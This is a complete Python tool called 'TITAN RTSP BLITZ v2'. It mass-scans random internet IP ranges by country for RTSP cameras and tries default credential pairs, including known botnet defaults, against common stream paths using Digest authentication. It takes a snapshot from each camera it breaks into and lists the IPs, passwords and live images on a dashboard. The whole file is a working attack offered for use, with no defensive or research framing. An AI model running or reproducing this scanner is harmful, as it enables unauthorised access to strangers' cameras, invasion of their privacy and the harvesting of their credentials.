#!/usr/bin/env python3
"""
TITAN RTSP BLITZ v2 — Find 100 live RTSP streams with proper Digest auth.

2-Phase approach:
  Phase 1: Async OPTIONS to find RTSP-speaking hosts (massively parallel)
  Phase 2: For each RTSP host, try DESCRIBE + Digest auth with top cred/path combos
  Frame grab via ffmpeg for thumbnails. Live dashboard on HTTP.
"""

import asyncio
import base64
import hashlib
import ipaddress
import json
import os
import random
import re
import subprocess
import sys
import threading
import time
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path

BASE = Path(__file__).resolve().parent
FRAMES = BASE / "blitz_frames"
RESULTS = BASE / "results"
FRAMES.mkdir(exist_ok=True)
RESULTS.mkdir(exist_ok=True)

sys.path.insert(0, str(BASE))
from cctv_config import GLOBAL_CIDRS

# ── Top paths by hit-rate ──
TOP_PATHS = [
    "/", "/live", "/stream1", "/Streaming/Channels/101", "/Streaming/Channels/102",
    "/cam/realmonitor?channel=1&subtype=0", "/cam/realmonitor?channel=1&subtype=1",
    "/h264/ch1/main/av_stream", "/0", "/1", "/onvif1", "/live.sdp",
    "/videoMain", "/axis-media/media.amp", "/stream", "/live/ch00_0",
    "/h264Preview_01_main", "/MediaInput/h264", "/video1", "/11",
]

# ── Top credentials ──
TOP_CREDS = [
    ("admin", ""),
    ("admin", "12345"),
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "888888"),
    ("admin", "666666"),
    ("admin", "1234"),
    ("admin", "password"),
    ("admin", "Admin123"),
    ("root", ""),
    ("root", "pass"),
    ("root", "root"),
    ("root", "vizxv"),
    ("root", "xc3511"),
    ("admin", "admin123"),
]

# ── Globals ──
LIVE_STREAMS = []
LOCK = threading.Lock()
TARGET = 100
STATS = {
    "ips_scanned": 0, "rtsp_hosts": 0, "probed": 0,
    "valid": 0, "frames": 0, "round": 0,
    "status": "init", "start_time": None,
    "host_200": 0, "host_401": 0, "host_404": 0,
}
DASHBOARD_PATH = BASE / "blitz_stream.html"
HTTP_PORT = 7702


# ═══════════════════════════════════════════════════════════
# IP GENERATOR
# ═══════════════════════════════════════════════════════════

def generate_ips(cidrs, count):
    nets = [ipaddress.ip_network(c, strict=False) for c in cidrs if '/' in c]
    weights = [n.num_addresses for n in nets]
    ips = set()
    while len(ips) < count:
        net = random.choices(nets, weights=weights, k=1)[0]
        if net.num_addresses > 2:
            off = random.randint(1, net.num_addresses - 2)
            ip = str(net.network_address + off)
            if not ip.endswith((".0", ".255")):
                ips.add(ip)
    return list(ips)


# ═══════════════════════════════════════════════════════════
# PHASE 1: ASYNC OPTIONS — find all RTSP speakers
# ═══════════════════════════════════════════════════════════

async def rtsp_options(ip, port, sem, timeout=1.5):
    """Send RTSP OPTIONS, classify response: 200/401/404/None."""
    async with sem:
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout)
            req = f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 1\r\n\r\n"
            w.write(req.encode())
            await w.drain()
            data = await asyncio.wait_for(r.read(512), timeout)
            w.close()
            resp = data.decode(errors="ignore")
            if "RTSP/1.0 200" in resp:
                return (ip, port, "200", resp)
            elif "401" in resp:
                return (ip, port, "401", resp)
            elif "404" in resp:
                return (ip, port, "404", resp)
            elif "RTSP" in resp:
                return (ip, port, "other", resp)
        except Exception:
            pass
    return None


async def find_rtsp_hosts(ips, port=554, concurrency=3000):
    """Mass scan: OPTIONS on port 554 to find RTSP-speaking hosts."""
    sem = asyncio.Semaphore(concurrency)
    tasks = [rtsp_options(ip, port, sem) for ip in ips]
    results = await asyncio.gather(*tasks)
    return [r for r in results if r]


# ═══════════════════════════════════════════════════════════
# DIGEST AUTH HELPER
# ═══════════════════════════════════════════════════════════

def compute_digest(user, pwd, realm, nonce, method, uri):
    ha1 = hashlib.md5(f"{user}:{realm}:{pwd}".encode()).hexdigest()
    ha2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
    return hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()


# ═══════════════════════════════════════════════════════════
# PHASE 2: DESCRIBE + DIGEST AUTH
# ═══════════════════════════════════════════════════════════

async def try_describe(ip, port, path, user="", pwd="", timeout=2.5):
    """DESCRIBE a path. If 401+Digest, authenticate. Return cam dict or None."""
    url = f"rtsp://{ip}:{port}{path}"
    describe = (
        f"DESCRIBE {url} RTSP/1.0\r\n"
        f"CSeq: 2\r\nAccept: application/sdp\r\n"
        f"User-Agent: LibVLC/3.0.18\r\n\r\n"
    )
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout)
        w.write(describe.encode())
        await w.drain()
        data = await asyncio.wait_for(r.read(4096), timeout)
        resp = data.decode(errors="ignore")

        if "RTSP/1.0 200" in resp:
            w.close()
            return {"ip": ip, "port": port, "rtsp_url": url,
                    "user": "", "password": "", "path": path,
                    "timestamp": datetime.now().isoformat(), "auth": "none"}

        if "401" in resp and user:
            realm_m = re.search(r'realm="([^"]*)"', resp)
            nonce_m = re.search(r'nonce="([^"]*)"', resp)
            if realm_m and nonce_m:
                realm, nonce = realm_m.group(1), nonce_m.group(1)
                dig = compute_digest(user, pwd, realm, nonce, "DESCRIBE", url)
                auth_req = (
                    f"DESCRIBE {url} RTSP/1.0\r\nCSeq: 3\r\n"
                    f"Accept: application/sdp\r\nUser-Agent: LibVLC/3.0.18\r\n"
                    f'Authorization: Digest username="{user}", realm="{realm}", '
                    f'nonce="{nonce}", uri="{url}", response="{dig}"\r\n\r\n'
                )
                w.write(auth_req.encode())
                await w.drain()
                data2 = await asyncio.wait_for(r.read(4096), timeout)
                resp2 = data2.decode(errors="ignore")
                if "RTSP/1.0 200" in resp2:
                    w.close()
                    auth_url = f"rtsp://{user}:{pwd}@{ip}:{port}{path}"
                    return {"ip": ip, "port": port, "rtsp_url": auth_url,
                            "user": user, "password": pwd, "path": path,
                            "timestamp": datetime.now().isoformat(), "auth": "digest"}
        w.close()
    except Exception:
        pass
    return None


async def probe_all_hosts(hosts_by_type, concurrency=300):
    """Probe all classified hosts — flat parallel, first-win per host."""
    sem = asyncio.Semaphore(concurrency)
    found = {}  # ip -> cam dict (first valid wins)
    found_lock = asyncio.Lock()

    async def try_one(ip, port, path, user, pwd):
        if ip in found:
            return
        async with sem:
            r = await try_describe(ip, port, path, user, pwd, timeout=2.0)
            if r and ip not in found:
                async with found_lock:
                    if ip not in found:
                        found[ip] = r

    tasks = []
    for ip, port, htype, _ in hosts_by_type:
        if htype == "200":
            # No-auth paths
            for path in TOP_PATHS:
                tasks.append(try_one(ip, port, path, "", ""))
        elif htype == "401":
            # Auth combos — top paths × top creds
            for path in TOP_PATHS[:8]:
                for user, pwd in TOP_CREDS[:8]:
                    tasks.append(try_one(ip, port, path, user, pwd))
        else:
            # 404/other — try all paths no-auth, then top cred combos
            for path in TOP_PATHS:
                tasks.append(try_one(ip, port, path, "", ""))
            for path in TOP_PATHS[:5]:
                for user, pwd in TOP_CREDS[:3]:
                    tasks.append(try_one(ip, port, path, user, pwd))

    await asyncio.gather(*tasks, return_exceptions=True)
    return list(found.values())


# ═══════════════════════════════════════════════════════════
# FRAME GRABBER
# ═══════════════════════════════════════════════════════════

def grab_frame(cam):
    safe = cam["ip"].replace(".", "_")
    fpath = str(FRAMES / f"cam_{safe}_{cam['port']}.jpg")
    try:
        r = subprocess.run(
            ["ffmpeg", "-y", "-rtsp_transport", "tcp",
             "-stimeout", "4000000", "-i", cam["rtsp_url"],
             "-vframes", "1", "-vf", "scale=640:-1",
             "-f", "image2", fpath],
            capture_output=True, timeout=8, text=True,
        )
        if r.returncode == 0 and os.path.isfile(fpath) and os.path.getsize(fpath) > 2000:
            cam["frame_file"] = fpath
            with open(fpath, "rb") as f:
                cam["frame_b64"] = base64.b64encode(f.read()).decode()
            res = re.search(r"(\d{2,5})x(\d{2,5})", r.stderr)
            cam["resolution"] = f"{res.group(1)}x{res.group(2)}" if res else "?"
            return True
    except Exception:
        pass
    cam["frame_b64"] = ""
    cam["resolution"] = "?"
    return False


# ═══════════════════════════════════════════════════════════
# MAIN HUNT LOOP
# ═══════════════════════════════════════════════════════════

def hunt(all_cidrs, batch_size=50000):
    STATS["status"] = "hunting"
    STATS["start_time"] = time.time()

    while len(LIVE_STREAMS) < TARGET:
        STATS["round"] += 1
        rnd = STATS["round"]

        ips = generate_ips(all_cidrs, batch_size)
        STATS["ips_scanned"] += len(ips)
        print(f"\n[R{rnd:>3}] Scanning {len(ips):,} IPs | found={len(LIVE_STREAMS)}/{TARGET}")

        # Phase 1: Find RTSP speakers
        loop = asyncio.new_event_loop()
        try:
            rtsp_hosts = loop.run_until_complete(find_rtsp_hosts(ips, port=554, concurrency=3000))
        finally:
            loop.close()

        if not rtsp_hosts:
            print(f"  → 0 RTSP hosts")
            continue

        STATS["rtsp_hosts"] += len(rtsp_hosts)
        h200 = [h for h in rtsp_hosts if h[2] == "200"]
        h401 = [h for h in rtsp_hosts if h[2] == "401"]
        h404 = [h for h in rtsp_hosts if h[2] in ("404", "other")]
        STATS["host_200"] += len(h200)
        STATS["host_401"] += len(h401)
        STATS["host_404"] += len(h404)
        print(f"  → {len(rtsp_hosts)} RTSP hosts: {len(h200)} open, {len(h401)} auth-req, {len(h404)} path-404")

        # Phase 2: DESCRIBE + Digest auth
        loop2 = asyncio.new_event_loop()
        try:
            valid = loop2.run_until_complete(probe_all_hosts(rtsp_hosts, concurrency=200))
        finally:
            loop2.close()

        STATS["probed"] += len(rtsp_hosts)

        for cam in valid:
            if len(LIVE_STREAMS) >= TARGET:
                break
            STATS["valid"] += 1

            # Grab thumbnail
            got = grab_frame(cam)
            if got:
                STATS["frames"] += 1

            with LOCK:
                LIVE_STREAMS.append(cam)

            elapsed = time.time() - STATS["start_time"]
            auth_tag = f"[{cam.get('auth','?')}]" if cam.get("user") else "[open]"
            print(f"  ✅ #{len(LIVE_STREAMS):>3}  {cam['ip']:>15}:554  {auth_tag:<10} path={cam['path']:<40}  res={cam.get('resolution','?'):<10}  [{elapsed:.0f}s]")

            if len(LIVE_STREAMS) % 5 == 0:
                save_results()
                regen_dashboard()

        # Also check port 8554
        if len(LIVE_STREAMS) < TARGET and rnd % 2 == 0:
            loop3 = asyncio.new_event_loop()
            try:
                h8554 = loop3.run_until_complete(find_rtsp_hosts(ips[:10000], port=8554, concurrency=2000))
                if h8554:
                    v8554 = loop3.run_until_complete(probe_all_hosts(h8554, concurrency=100))
                    for cam in v8554:
                        if len(LIVE_STREAMS) >= TARGET:
                            break
                        STATS["valid"] += 1
                        grab_frame(cam)
                        with LOCK:
                            LIVE_STREAMS.append(cam)
                        print(f"  ✅ #{len(LIVE_STREAMS):>3}  {cam['ip']:>15}:8554  path={cam['path']}")
            finally:
                loop3.close()

        save_results()
        regen_dashboard()

    STATS["status"] = "complete"
    elapsed = time.time() - STATS["start_time"]
    save_results()
    regen_dashboard()
    print(f"\n{'='*70}")
    print(f"  COMPLETE — {len(LIVE_STREAMS)} live RTSP streams in {elapsed:.0f}s")
    print(f"{'='*70}")


# ═══════════════════════════════════════════════════════════
# DASHBOARD
# ═══════════════════════════════════════════════════════════

def regen_dashboard():
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    elapsed = time.time() - (STATS["start_time"] or time.time())
    rate = STATS["valid"] / max(elapsed / 60, 0.01)

    cards = ""
    for i, c in enumerate(LIVE_STREAMS):
        b64 = c.get("frame_b64", "")
        img = f'<img src="data:image/jpeg;base64,{b64}" style="width:100%;border-radius:6px;margin-top:6px;">' if b64 else '<div style="height:120px;background:#222;border-radius:6px;display:flex;align-items:center;justify-content:center;color:#555;font-size:11px;">No frame yet</div>'
        auth_badge = '<span style="color:#0f0;">OPEN</span>' if not c.get("user") else f'<span style="color:#ff0;">{c["user"]}:{c["password"]}</span>'
        cards += f'''
        <div style="background:#1a1a2e;border:1px solid #0f0;border-radius:8px;padding:10px;margin:6px;width:280px;flex-shrink:0;">
            <div style="display:flex;justify-content:space-between;align-items:center;">
                <span style="color:#0f0;font-weight:bold;">#{i+1}</span>
                {auth_badge}
            </div>
            <div style="color:#ccc;font-size:12px;">{c["ip"]}:{c["port"]}</div>
            {img}
            <div style="font-size:11px;color:#aaa;margin-top:4px;">
                Path: <code style="color:#0ff;">{c.get("path","?")}</code><br>
                Res: {c.get("resolution","?")} | Auth: {c.get("auth","?")}<br>
                <span style="font-size:9px;color:#666;word-break:break-all;">{c.get("rtsp_url","")}</span>
            </div>
        </div>'''

    pct = min(100, len(LIVE_STREAMS))
    html = f'''<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>RTSP BLITZ — Live</title>
<meta http-equiv="refresh" content="8">
<style>
body{{background:#0a0a15;color:#eee;font-family:'Courier New',monospace;margin:0;padding:20px;}}
code{{background:#000;padding:1px 4px;border-radius:3px;}}
.s{{display:inline-block;background:#111;padding:6px 12px;border-radius:6px;margin:3px;border:1px solid #333;font-size:13px;}}
.s b{{color:#0f0;}}
</style></head>
<body>
<h1 style="color:#f00;margin-bottom:4px;">⚡ TITAN RTSP BLITZ v2 — Live Stream Hunter</h1>
<div style="margin:10px 0 15px;">
  <span class="s">Status: <b>{STATS["status"].upper()}</b></span>
  <span class="s">IPs: <b>{STATS["ips_scanned"]:,}</b></span>
  <span class="s">RTSP Hosts: <b>{STATS["rtsp_hosts"]:,}</b></span>
  <span class="s">200: <b>{STATS["host_200"]}</b></span>
  <span class="s">401: <b>{STATS["host_401"]}</b></span>
  <span class="s">404: <b>{STATS["host_404"]}</b></span>
  <span class="s" style="border-color:#0f0;">Streams: <b style="font-size:16px;">{len(LIVE_STREAMS)}/{TARGET}</b></span>
  <span class="s">Frames: <b>{STATS["frames"]}</b></span>
  <span class="s">Rate: <b>{rate:.1f}/min</b></span>
  <span class="s">Round: <b>{STATS["round"]}</b></span>
  <span class="s">Elapsed: <b>{elapsed:.0f}s</b></span>
</div>
<div style="width:100%;background:#111;border-radius:8px;height:22px;overflow:hidden;margin-bottom:15px;">
  <div style="background:linear-gradient(90deg,#0f0,#0ff);height:100%;width:{pct}%;border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:bold;color:#000;font-size:11px;">{pct}%</div>
</div>
<div style="display:flex;flex-wrap:wrap;">{cards}</div>
<p style="color:#333;font-size:10px;margin-top:30px;">Auto-refreshes every 8s | {ts}</p>
</body></html>'''
    DASHBOARD_PATH.write_text(html)


def save_results():
    out = {
        "timestamp": datetime.now().isoformat(),
        "stats": STATS,
        "streams": [
            {k: c.get(k) for k in ["ip", "port", "rtsp_url", "user", "password", "path", "resolution", "auth", "timestamp"]}
            for c in LIVE_STREAMS
        ],
    }
    with open(RESULTS / "rtsp_blitz_live.json", "w") as f:
        json.dump(out, f, indent=2, default=str)


# ═══════════════════════════════════════════════════════════
# HTTP SERVER
# ═══════════════════════════════════════════════════════════

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/api/stats":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            data = {"stats": STATS, "found": len(LIVE_STREAMS), "target": TARGET}
            self.wfile.write(json.dumps(data, default=str).encode())
        elif DASHBOARD_PATH.exists():
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(DASHBOARD_PATH.read_bytes())
        else:
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<html><body style='background:#000;color:#0f0;'><h1>Starting...</h1></body></html>")
    def log_message(self, fmt, *args):
        pass

def start_server(port):
    HTTPServer(('0.0.0.0', port), Handler).serve_forever()


# ═══════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--target", type=int, default=100)
    p.add_argument("--port", type=int, default=7702)
    p.add_argument("--batch", type=int, default=50000)
    args = p.parse_args()

    TARGET = args.target
    HTTP_PORT = args.port
    all_cidrs = [c for country in GLOBAL_CIDRS.values() for c in country]
    print(f"[INIT] {len(all_cidrs)} CIDRs across {len(GLOBAL_CIDRS)} countries")

    regen_dashboard()
    threading.Thread(target=start_server, args=(HTTP_PORT,), daemon=True).start()

    print(f"\n{'='*70}")
    print(f"  ⚡ TITAN RTSP BLITZ v2 — Target: {TARGET} live streams")
    print(f"  Batch: {args.batch:,} IPs | Dashboard: http://localhost:{HTTP_PORT}")
    print(f"{'='*70}\n")

    try:
        hunt(all_cidrs, batch_size=args.batch)
    except KeyboardInterrupt:
        print(f"\nStopped. {len(LIVE_STREAMS)} streams found.")
    finally:
        save_results()
        regen_dashboard()
        print(f"Results: {RESULTS / 'rtsp_blitz_live.json'}")
        print(f"Dashboard: {DASHBOARD_PATH}")
